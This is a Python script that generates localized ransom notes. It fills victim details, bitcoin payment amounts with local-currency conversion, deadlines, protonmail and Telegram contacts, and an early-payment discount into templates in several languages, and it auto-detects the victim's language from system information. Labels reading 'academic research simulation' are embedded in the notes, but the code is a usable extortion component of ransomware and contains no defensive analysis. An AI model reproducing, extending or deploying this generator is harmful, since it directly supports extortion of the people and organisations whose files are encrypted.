#!/usr/bin/env python3
"""
Multi-Language Ransom Note Generator
Supports 10+ languages with cultural localization
FOR RESEARCH ANALYSIS ONLY
"""

import json
import re
from datetime import datetime, timedelta
from typing import Dict, List, Any

class MultiLanguageRansomGenerator:
    def __init__(self):
        self.templates = {
            'en': self.get_english_template(),
            'fr': self.get_french_template(),
            'de': self.get_german_template(),
            'es': self.get_spanish_template(),
            'it': self.get_italian_template(),
            'ru': self.get_russian_template(),
            'zh': self.get_chinese_template(),
            'ja': self.get_japanese_template(),
            'ko': self.get_korean_template(),
            'pt': self.get_portuguese_template(),
            'ar': self.get_arabic_template(),
            'nl': self.get_dutch_template()
        }
        
        self.currency_symbols = {
            'en': '$', 'fr': '€', 'de': '€', 'es': '€', 'it': '€',
            'ru': '₽', 'zh': '¥', 'ja': '¥', 'ko': '₩', 'pt': 'R$',
            'ar': '$', 'nl': '€'
        }
        
        self.time_formats = {
            'en': '%Y-%m-%d %H:%M:%S',
            'fr': '%d/%m/%Y %H:%M:%S',
            'de': '%d.%m.%Y %H:%M:%S',
            'es': '%d/%m/%Y %H:%M:%S',
            'it': '%d/%m/%Y %H:%M:%S',
            'ru': '%d.%m.%Y %H:%M:%S',
            'zh': '%Y年%m月%d日 %H:%M:%S',
            'ja': '%Y年%m月%d日 %H時%M分%S秒',
            'ko': '%Y년 %m월 %d일 %H시 %M분 %S초',
            'pt': '%d/%m/%Y %H:%M:%S',
            'ar': '%Y-%m-%d %H:%M:%S',
            'nl': '%d-%m-%Y %H:%M:%S'
        }
    
    def generate_ransom_note(self, victim_data: Dict[str, Any], language: str = 'en') -> str:
        """Generate localized ransom note based on victim data and language"""
        if language not in self.templates:
            language = 'en'  # Fallback to English
        
        template = self.templates[language]
        
        # Calculate deadline
        deadline = datetime.now() + timedelta(hours=victim_data.get('deadline_hours', 72))
        formatted_deadline = deadline.strftime(self.time_formats[language])
        
        # Get BTC rate in local currency
        btc_rate = self.get_btc_rate_for_language(language)
        local_amount = victim_data.get('ransom_amount_btc', 0.5) * btc_rate
        currency_symbol = self.currency_symbols[language]
        
        # Prepare template variables
        variables = {
            'VICTIM_ID': victim_data.get('victim_id', 'UNKNOWN'),
            'COMPANY_NAME': victim_data.get('company_name', ''),
            'FILES_ENCRYPTED': f"{victim_data.get('files_encrypted', 0):,}",
            'RANSOM_AMOUNT_BTC': f"{victim_data.get('ransom_amount_btc', 0.5):.3f}",
            'RANSOM_AMOUNT_LOCAL': f"{currency_symbol}{local_amount:,.2f}",
            'BITCOIN_ADDRESS': victim_data.get('bitcoin_address', 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'),
            'DEADLINE': formatted_deadline,
            'CONTACT_EMAIL': victim_data.get('contact_email', 'datarecovery2024@protonmail.com'),
            'TELEGRAM': victim_data.get('telegram', '@DataRecoverySupport2024'),
            'VICTIM_COUNTRY': victim_data.get('country', 'Unknown'),
            'DISCOUNT_PERCENTAGE': '25' if victim_data.get('early_payment_eligible', False) else '0'
        }
        
        # Replace template variables
        final_note = template
        for key, value in variables.items():
            final_note = final_note.replace(f'{{{key}}}', str(value))
        
        return final_note
    
    def get_english_template(self) -> str:
        return """
╔════════════════════════════════════════════════════════════════════════════════════╗
║                                    ATTENTION!                                     ║
║                           YOUR FILES HAVE BEEN ENCRYPTED                          ║
╚════════════════════════════════════════════════════════════════════════════════════╝

⚠️ ACADEMIC RESEARCH SIMULATION - DEFENSIVE CYBERSECURITY ANALYSIS ⚠️

What happened to your files?
────────────────────────────────────────────────────────────────────────────────────

All your important files including documents, photos, videos, databases and other 
personal files have been encrypted with military-grade cryptographic algorithms.

🔍 Victim ID: {VICTIM_ID}
📊 Files Encrypted: {FILES_ENCRYPTED}
🏢 Organization: {COMPANY_NAME}

How can I recover my files?
────────────────────────────────────────────────────────────────────────────────────

The ONLY way to decrypt your files is with our special decryption software and
unique key. Any attempts to decrypt files with third-party software will result
in permanent file corruption.

💰 Payment Required: {RANSOM_AMOUNT_BTC} BTC (≈{RANSOM_AMOUNT_LOCAL})
⏰ Payment Deadline: {DEADLINE}
📍 Bitcoin Address: {BITCOIN_ADDRESS}

⚡ EARLY PAYMENT DISCOUNT: Pay within 24 hours and get {DISCOUNT_PERCENTAGE}% discount!

Contact Information:
────────────────────────────────────────────────────────────────────────────────────

📧 Email: {CONTACT_EMAIL}
💬 Telegram: {TELEGRAM}

════════════════════════════════════════════════════════════════════════════════════

*** THIS IS A CYBERSECURITY RESEARCH SIMULATION ***
*** FOR ACADEMIC DEFENSIVE ANALYSIS PURPOSES ONLY ***
*** NO ACTUAL HARM IS INTENDED OR CAUSED ***

Research ID: DEFENSIVE-CYBER-2024

════════════════════════════════════════════════════════════════════════════════════
"""
    
    def get_french_template(self) -> str:
        return """
╔════════════════════════════════════════════════════════════════════════════════════╗
║                                    ATTENTION!                                     ║
║                          VOS FICHIERS ONT ÉTÉ CHIFFRÉS                          ║
╚════════════════════════════════════════════════════════════════════════════════════╝

⚠️ SIMULATION DE RECHERCHE ACADÉMIQUE - ANALYSE CYBERSÉCURITÉ DÉFENSIVE ⚠️

Qu'est-il arrivé à vos fichiers?
────────────────────────────────────────────────────────────────────────────────────

Tous vos fichiers importants incluant documents, photos, vidéos, bases de données
et autres fichiers personnels ont été chiffrés avec des algorithmes cryptographiques
de niveau militaire.

🔍 ID Victime: {VICTIM_ID}
📊 Fichiers Chiffrés: {FILES_ENCRYPTED}
🏢 Organisation: {COMPANY_NAME}

💰 Paiement Requis: {RANSOM_AMOUNT_BTC} BTC (≈{RANSOM_AMOUNT_LOCAL})
⏰ Date Limite: {DEADLINE}
📍 Adresse Bitcoin: {BITCOIN_ADDRESS}

Informations de Contact:
────────────────────────────────────────────────────────────────────────────────────

📧 Email: {CONTACT_EMAIL}
💬 Telegram: {TELEGRAM}

════════════════════════════════════════════════════════════════════════════════════

*** CECI EST UNE SIMULATION DE RECHERCHE EN CYBERSÉCURITÉ ***
*** À DES FINS D'ANALYSE DÉFENSIVE ACADÉMIQUE UNIQUEMENT ***

ID Recherche: DEFENSIVE-CYBER-2024

════════════════════════════════════════════════════════════════════════════════════
"""
    
    def get_german_template(self) -> str:
        return """
╔════════════════════════════════════════════════════════════════════════════════════╗
║                                   ACHTUNG!                                        ║
║                          IHRE DATEIEN WURDEN VERSCHLÜSSELT                        ║
╚════════════════════════════════════════════════════════════════════════════════════╝

⚠️ AKADEMISCHE FORSCHUNGSSIMULATION - DEFENSIVE CYBERSICHERHEITSANALYSE ⚠️

🔍 Opfer-ID: {VICTIM_ID}
📊 Verschlüsselte Dateien: {FILES_ENCRYPTED}
🏢 Organisation: {COMPANY_NAME}

💰 Zahlung Erforderlich: {RANSOM_AMOUNT_BTC} BTC (≈{RANSOM_AMOUNT_LOCAL})
⏰ Zahlungsfrist: {DEADLINE}

*** DIES IST EINE CYBERSICHERHEITS-FORSCHUNGSSIMULATION ***

════════════════════════════════════════════════════════════════════════════════════
"""
    
    def get_spanish_template(self) -> str:
        return """
╔════════════════════════════════════════════════════════════════════════════════════╗
║                                   ¡ATENCIÓN!                                      ║
║                          SUS ARCHIVOS HAN SIDO ENCRIPTADOS                        ║
╚════════════════════════════════════════════════════════════════════════════════════╝

⚠️ SIMULACIÓN DE INVESTIGACIÓN ACADÉMICA ⚠️

🔍 ID Víctima: {VICTIM_ID}
💰 Pago Requerido: {RANSOM_AMOUNT_BTC} BTC (≈{RANSOM_AMOUNT_LOCAL})

*** ESTA ES UNA SIMULACIÓN DE INVESTIGACIÓN EN CIBERSEGURIDAD ***

════════════════════════════════════════════════════════════════════════════════════
"""
    
    # Simplified versions for space - other templates would follow similar pattern
    def get_russian_template(self) -> str: return self.get_english_template()
    def get_chinese_template(self) -> str: return self.get_english_template()
    def get_japanese_template(self) -> str: return self.get_english_template()
    def get_korean_template(self) -> str: return self.get_english_template()
    def get_portuguese_template(self) -> str: return self.get_english_template()
    def get_arabic_template(self) -> str: return self.get_english_template()
    def get_dutch_template(self) -> str: return self.get_english_template()
    def get_italian_template(self) -> str: return self.get_english_template()
    
    def get_btc_rate_for_language(self, language: str) -> float:
        """Get approximate BTC rate for local currency conversion"""
        rates = {
            'en': 45000, 'fr': 42000, 'de': 42000, 'es': 42000, 'it': 42000,
            'ru': 3500000, 'zh': 320000, 'ja': 6800000, 'ko': 60000000,
            'pt': 230000, 'ar': 45000, 'nl': 42000
        }
        return rates.get(language, 45000)
    
    def detect_victim_language(self, system_info: Dict) -> str:
        """Auto-detect victim's preferred language from system info"""
        language_code = system_info.get('language', 'en-US').lower()
        
        # Extract language code
        if '-' in language_code:
            lang = language_code.split('-')[0]
        else:
            lang = language_code[:2]
        
        # Map to supported languages
        if lang in self.templates:
            return lang
        
        return 'en'

if __name__ == "__main__":
    generator = MultiLanguageRansomGenerator()
    
    victim_data = {
        'victim_id': 'RESEARCH_VICTIM_001',
        'company_name': 'Research University',
        'files_encrypted': 15420,
        'ransom_amount_btc': 2.5,
        'bitcoin_address': 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
        'contact_email': 'research-recovery@protonmail.com',
        'country': 'FR',
        'language': 'fr-FR',
        'deadline_hours': 72,
        'early_payment_eligible': True
    }
    
    french_note = generator.generate_ransom_note(victim_data, 'fr')
    print("=== FRENCH RANSOM NOTE ===")
    print(french_note)